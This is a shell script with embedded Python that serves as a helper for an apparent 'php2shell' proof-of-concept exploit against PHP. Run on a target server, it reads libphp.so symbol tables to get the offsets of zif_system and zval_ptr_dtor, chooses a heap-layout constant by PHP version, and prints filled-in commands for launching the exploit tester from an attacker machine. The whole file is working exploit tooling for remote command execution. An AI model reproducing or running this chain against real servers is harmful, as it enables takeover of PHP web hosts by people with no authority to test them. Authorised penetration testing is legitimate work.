#!/usr/bin/env bash
# =============================================================================
# p2s_target_vars.sh  --  run this ON THE TARGET SERVER (authorized testing).
#
# It reads the per-build constants the php2shell PoC needs but cannot know in
# advance, straight out of the box's own PHP binary, and prints them as ready
# CLI arguments for the tester.
#
#   zif_offset     offset of zif_system   inside libphp.so   (static, per build)
#   dtor_offset    offset of zval_ptr_dtor inside libphp.so  (static, per build)
#   htdata_offset  heap-layout constant, keyed to the PHP MINOR version
#
# It does NOT (and cannot) produce the two ASLR bases -- the live addresses of
# the heap and of libphp.so. Those are randomized per request and the exploit
# leaks them itself at run time. This script only closes the "exact-build"
# knowledge gap when you have local access to the target.
#
# Needs only: python3  (uses readelf/nm if present, else an embedded ELF reader).
# No network, writes nothing outside --out. Read-only on the target.
#
# Usage:
#   ./p2s_target_vars.sh                       # auto-find libphp.so
#   ./p2s_target_vars.sh /path/to/libphp.so    # explicit binary
#   ./p2s_target_vars.sh --php 8.3             # force the minor (htdata pick)
#   ./p2s_target_vars.sh --env  > vars.env     # sourceable  ZIF_OFFSET=...
#   ./p2s_target_vars.sh --json > vars.json    # machine-readable
#
# Then, from the ATTACKER box, hand each value to the tester:
#   python3 p2s_verify.py -u http://TARGET/ \
#       --zif-offset 0x.. --dtor-offset 0x.. --htdata-offset 0x..
# (the exact command is printed at the end, filled in).
# =============================================================================
set -euo pipefail

LIB=""; FORCE_PHP=""; FORCE_HTD=""; FMT="human"; OUT=""
while [ $# -gt 0 ]; do
  case "$1" in
    --php)   FORCE_PHP="${2:-}"; shift 2;;
    --htdata) FORCE_HTD="${2:-}"; shift 2;;
    --env)   FMT="env"; shift;;
    --json)  FMT="json"; shift;;
    --out)   OUT="${2:-}"; shift 2;;
    -h|--help) sed -n '2,40p' "$0"; exit 0;;
    -*)      echo "unknown flag: $1" >&2; exit 2;;
    *)       LIB="$1"; shift;;
  esac
done

log(){ [ "$FMT" = human ] && echo "$@" >&2 || true; }

# --- 1. locate the PHP module / binary that holds the symbols ----------------
if [ -z "$LIB" ]; then
  for c in \
    /usr/lib/apache2/modules/libphp*.so \
    /usr/lib/apache2/modules/libphp.so \
    /usr/lib64/httpd/modules/libphp*.so \
    /usr/lib/httpd/modules/libphp*.so \
    /usr/local/lib/libphp*.so ; do
    for f in $c; do [ -f "$f" ] && { LIB="$f"; break 2; }; done
  done
fi
# php-fpm / cli binary fallback (symbols live in the binary itself)
if [ -z "$LIB" ]; then
  for b in php-fpm php-fpm8.5 php-fpm8.4 php-fpm8.3 php8.5 php8.4 php8.3 php php-cgi; do
    p="$(command -v "$b" 2>/dev/null || true)"; [ -n "$p" ] && { LIB="$(readlink -f "$p")"; break; }
  done
fi
[ -n "$LIB" ] && [ -f "$LIB" ] || { echo "[-] no libphp.so / php binary found; pass one: $0 /path/to/libphp.so" >&2; exit 1; }
log "[*] target binary : $LIB"

# --- 2. detect the PHP minor (for the htdata pick) ---------------------------
PHPVER="$FORCE_PHP"
if [ -z "$PHPVER" ]; then
  for b in php php-fpm php8.5 php8.4 php8.3; do
    p="$(command -v "$b" 2>/dev/null || true)"; [ -z "$p" ] && continue
    v="$("$p" -v 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+' | head -1 || true)"
    [ -n "$v" ] && { PHPVER="$v"; break; }
  done
fi

# --- 3. extract zif_system / zval_ptr_dtor + build-id + PHP version ----------
#     Pure-python ELF reader: no binutils needed, parses symtab OR dynsym,
#     follows a *-dbgsym debug object if the installed binary is stripped.
OFF="$(python3 -I - "$LIB" <<'PY'
import struct, sys, glob, os, re, subprocess
lib = sys.argv[1]
SHT_SYMTAB, SHT_DYNSYM, PT_LOAD, PT_NOTE = 2, 11, 1, 4

def parse(path):
    data = open(path, "rb").read()
    if data[:4] != b"\x7fELF" or data[4] != 2:
        return None
    e_phoff,  = struct.unpack_from("<Q", data, 0x20)
    e_shoff,  = struct.unpack_from("<Q", data, 0x28)
    e_phentsize, e_phnum = struct.unpack_from("<HH", data, 0x36)
    e_shentsize, e_shnum = struct.unpack_from("<HH", data, 0x3A)
    loads = []
    bid = ""
    for i in range(e_phnum):
        o = e_phoff + i*e_phentsize
        p_type,  = struct.unpack_from("<I", data, o)
        p_off,   = struct.unpack_from("<Q", data, o+8)
        p_vaddr, = struct.unpack_from("<Q", data, o+16)
        p_fsz,   = struct.unpack_from("<Q", data, o+32)
        p_memsz, = struct.unpack_from("<Q", data, o+40)
        if p_type == PT_LOAD and p_memsz:
            loads.append(p_vaddr)
        if p_type == PT_NOTE and not bid:
            seg = data[p_off:p_off+p_fsz]; j = 0
            while j+12 <= len(seg):
                ns, ds, nt = struct.unpack_from("<III", seg, j)
                name = seg[j+12:j+12+ns]
                if nt == 3 and name.startswith(b"GNU"):
                    ds_off = j+12 + ((ns+3)&~3)
                    bid = seg[ds_off:ds_off+ds].hex()
                j += 12 + ((ns+3)&~3) + ((ds+3)&~3)
    bias = min(loads) if loads else 0
    secs = []
    for i in range(e_shnum):
        o = e_shoff + i*e_shentsize
        sh_type,   = struct.unpack_from("<I", data, o+4)
        sh_off,    = struct.unpack_from("<Q", data, o+24)
        sh_size,   = struct.unpack_from("<Q", data, o+32)
        sh_link,   = struct.unpack_from("<I", data, o+40)
        sh_entsize,= struct.unpack_from("<Q", data, o+56)
        secs.append((sh_type, sh_off, sh_size, sh_link, sh_entsize))
    want = {"zif_system": None, "zval_ptr_dtor": None}
    for sh_type, sh_off, sh_size, sh_link, sh_entsize in secs:
        if sh_type not in (SHT_SYMTAB, SHT_DYNSYM):
            continue
        if sh_link >= len(secs):
            continue
        str_off = secs[sh_link][1]
        ent = sh_entsize or 24
        for i in range(sh_size // ent):
            o = sh_off + i*ent
            st_name,  = struct.unpack_from("<I", data, o)
            st_value, = struct.unpack_from("<Q", data, o+8)
            if not st_name:
                continue
            end = data.find(b"\x00", str_off+st_name)
            nm = data[str_off+st_name:end].decode("ascii","replace")
            if nm in want and want[nm] is None:
                want[nm] = st_value
    # PHP version from the binary. Primary anchor: the SAPI "PHP/X.Y.Z" string
    # (the X-Powered-By value, exactly the compiled version). Backup: the Zend
    # engine string -- PHP 8.N.M <-> "Zend Engine v4.N.M".
    ver = ""
    m = re.search(rb"PHP/([78]\.\d{1,2}\.\d{1,2})", data)
    if m:
        ver = m.group(1).decode()
    else:
        mz = re.search(rb"Zend Engine v(\d+)\.(\d+)\.(\d+)", data)
        if mz and int(mz.group(1)) == 4:
            ver = f"8.{int(mz.group(2))}.{int(mz.group(3))}"
    return bias, want, bid, ver

res = parse(lib)
# stripped? look for a matching dbgsym debug object.
if res and (res[1]["zif_system"] is None or res[1]["zval_ptr_dtor"] is None):
    bid = res[2]
    cands = []
    if bid:
        cands.append(f"/usr/lib/debug/.build-id/{bid[:2]}/{bid[2:]}.debug")
    cands += glob.glob("/usr/lib/debug/usr/lib/apache2/modules/libphp*")
    cands += glob.glob("/usr/lib/debug/**/libphp*.debug", recursive=True)
    for c in cands:
        if os.path.exists(c):
            r2 = parse(c)
            if r2 and r2[1]["zif_system"] and r2[1]["zval_ptr_dtor"]:
                res = (res[0], r2[1], res[2], res[3] or r2[3]); break

if not res or res[1]["zif_system"] is None or res[1]["zval_ptr_dtor"] is None:
    minor = ".".join((res[3] or "8.4").split(".")[:2]) if res else "8.4"
    sys.stderr.write("[-] zif_system / zval_ptr_dtor not found (this binary is stripped).\n"
                     f"    Install the matching -dbgsym package for PHP {minor} and re-run, e.g.\n"
                     f"      sudo apt-get install libapache2-mod-php{minor}-dbgsym\n"
                     "    (Debian/Ubuntu ddebs; other distros ship php*-debuginfo.)\n")
    sys.exit(3)

bias, want, bid, ver = res
zif  = want["zif_system"]   - bias
dtor = want["zval_ptr_dtor"] - bias
print(f"0x{zif:x} 0x{dtor:x} {bid or '-'} {ver or '-'}")
PY
)"

[ -n "$OFF" ] || { echo "[-] could not read offsets from $LIB" >&2; exit 3; }
ZIF="$(echo "$OFF" | awk '{print $1}')"
DTOR="$(echo "$OFF" | awk '{print $2}')"
BID="$(echo "$OFF" | awk '{print $3}')";          [ "$BID" = "-" ] && BID=""
VER_FROM_BIN="$(echo "$OFF" | awk '{print $4}')"; [ "$VER_FROM_BIN" = "-" ] && VER_FROM_BIN=""
# Precedence: --php override > version embedded IN this binary > local `php -v`.
# (The embedded version belongs to the file under test; the host's php -v may be
#  a different build entirely, so it is only a last resort.)
if   [ -n "$FORCE_PHP" ];     then PHPVER="$FORCE_PHP"
elif [ -n "$VER_FROM_BIN" ];  then PHPVER="$VER_FROM_BIN"
fi

# --- 4. htdata pick (keyed to the minor; sweepable by the tester) -----------
MINOR="$(echo "${PHPVER:-}" | grep -oE '^[0-9]+\.[0-9]+' || true)"
if [ -n "$FORCE_HTD" ]; then HTD="$FORCE_HTD"; HTSRC="forced"
else
  case "$MINOR" in
    8.3) HTD="0x6A0D8"; HTSRC="PHP 8.3 minor";;
    8.4|8.5) HTD="0x690D8"; HTSRC="PHP $MINOR minor";;
    "") HTD="0x690D8"; HTSRC="UNKNOWN version -- guess, sweep it";;
    *) HTD="0x690D8"; HTSRC="PHP $MINOR unmapped -- guess, sweep it";;
  esac
fi

# --- 5. emit ----------------------------------------------------------------
case "$FMT" in
  env)
    printf 'ZIF_OFFSET=%s\nDTOR_OFFSET=%s\nHTDATA_OFFSET=%s\nPHP_VERSION=%s\nBUILD_ID=%s\n' \
      "$ZIF" "$DTOR" "$HTD" "${PHPVER:-unknown}" "${BID:-}" ;;
  json)
    printf '{"zif_offset":"%s","dtor_offset":"%s","htdata_offset":"%s","php_version":"%s","build_id":"%s","libphp":"%s"}\n' \
      "$ZIF" "$DTOR" "$HTD" "${PHPVER:-unknown}" "${BID:-}" "$LIB" ;;
  *)
    cat >&2 <<EOF

  ===============================================================
   php2shell  --  per-build variables for this target
  ===============================================================
   php version   : ${PHPVER:-unknown}
   libphp / bin  : $LIB
   build-id      : ${BID:-n/a}
  ---------------------------------------------------------------
   ZIF_OFFSET    = $ZIF      (zif_system)
   DTOR_OFFSET   = $DTOR      (zval_ptr_dtor)
   HTDATA_OFFSET = $HTD      ($HTSRC)
  ---------------------------------------------------------------
   NOT derivable here -- leaked LIVE by the exploit, per request:
     * chunk base   (where the heap is this run)
     * libphp base  (where PHP's code is this run)
  ===============================================================

  Run the blind, no-artifact tester from the attacker box:

    python3 p2s_verify.py -u http://TARGET/ \\
        --zif-offset $ZIF \\
        --dtor-offset $DTOR \\
        --htdata-offset $HTD

  Or the convenience wrapper:

    ./p2s_offtest.sh -u http://TARGET/ --zif $ZIF --dtor $DTOR --htdata $HTD

EOF
    ;;
esac

if [ -n "$OUT" ]; then
  { printf 'ZIF_OFFSET=%s\nDTOR_OFFSET=%s\nHTDATA_OFFSET=%s\nPHP_VERSION=%s\nBUILD_ID=%s\n' \
      "$ZIF" "$DTOR" "$HTD" "${PHPVER:-unknown}" "${BID:-}"; } > "$OUT"
  log "[+] wrote $OUT"
fi
